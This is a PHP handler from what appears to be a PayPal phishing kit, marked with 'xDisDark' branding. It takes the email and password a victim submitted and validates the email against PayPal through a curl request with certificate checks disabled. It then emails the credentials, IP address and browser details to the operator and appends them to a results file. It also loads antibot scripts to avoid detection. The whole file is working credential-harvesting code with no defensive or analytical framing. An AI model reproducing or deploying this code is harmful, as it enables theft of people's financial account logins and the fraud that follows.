<?php
session_start();

include "antibots.php";
include "config.php";
include "nav_detect.php";
/*

 */
$email = $_POST['email'];
$password = $_POST['pass'];

@set_time_limit(0);

function curl($url='',$Follow=False){
    global $set;
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT,20);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&cmd=_send-money&myAllTextSubmitID=&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email=dznoob@check.foryou&email=dznoob@check.foryou&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue&browser_name=Firefox&browser_name=Firefox&browser_version=10&browser_version=11&browser_version_full=10.0.2&browser_version_full=11.0&operating_system=Windows&operating_system=Windows');
    curl_setopt($curl, CURLOPT_COOKIE,'PP1.txt');
    curl_setopt($curl, CURLOPT_COOKIEFILE,'PP1.txt');
    curl_setopt($curl, CURLOPT_COOKIEJAR,'PP1.txt');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 3);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    if ($Follow !== False) {
        curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
    }
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
ini_set("user_agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)");
$_CheckAction = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_send-money&cmd=_send-money&myAllTextSubmitID=&type=external&payment_source=p2p_mktgpage&payment_type=Gift&sender_email='.$email.'&email=dznoob@check.foryou&currency=USD&amount=10&amount_ccode=USD&submit.x=Continue&browser_name=Firefox&browser_name=Firefox&browser_version=10&browser_version=11&browser_version_full=10.0.2&browser_version_full=11.0&operating_system=Windows&operating_system=Windows',CURLOPT_FAILONERROR,TRUE);
if(!strpos($_CheckAction, "region"))

{

////////////////////////////////////////////////
    if(strlen($password) > 7  ) {
        ?>
        <meta HTTP-EQUIV='REFRESH' content="0; url=prog.php?y=<?php echo md5(rand(100, 999999999)); ?> ">
        <?php


        /*
        
         */


///////////////////////// MAIL PART //////////////////////

        $email = $_POST['email'];
        $password = $_POST['pass'];
        $IP_Connected = $_SERVER['REMOTE_ADDR'];
        $Machine = php_uname();
        $Info_LOG = "
|===============| xDisDark |================|
|-------------------- LOGIN ------------------|
|Email            : $email
|password         : $password
|IP Connected     : $IP_Connected
|Browser          : $yourbrowser";


// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = '♥ PP LOGIN FROM ♥ : '.$IP_Connected.'';
            $headers = 'From: xDisDark' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
            mail($to, $subject, $Info_LOG, $headers);
        }
//FTP
        if ($Ftp_Write == 1) {
            $file = fopen("rst/Result-By-OuNi-Xhack." . $IP_Connected . ".txt", 'a');
            fwrite($file, $Info_LOG);
        }

    }
    else



    {

        date_default_timezone_set('GMT');
        $line = date('Y-m-d H:i:s') . " - $email ";
        file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);

        ?><meta HTTP-EQUIV='REFRESH' content="0; url=index.php?loginError_id=c<?php echo md5(rand(100, 999999999)); ?> 15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"><?php
    }
////////////////////////////////////////////////

}

else
{
    date_default_timezone_set('GMT');
    $line = date('Y-m-d H:i:s') . " - $email ";
    file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);


    ?><meta HTTP-EQUIV='REFRESH' content="0; url=index.php?loginError_id=c3Fauth<?php echo md5(rand(100, 999999999)); ?> 2da15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"><?php

}

?>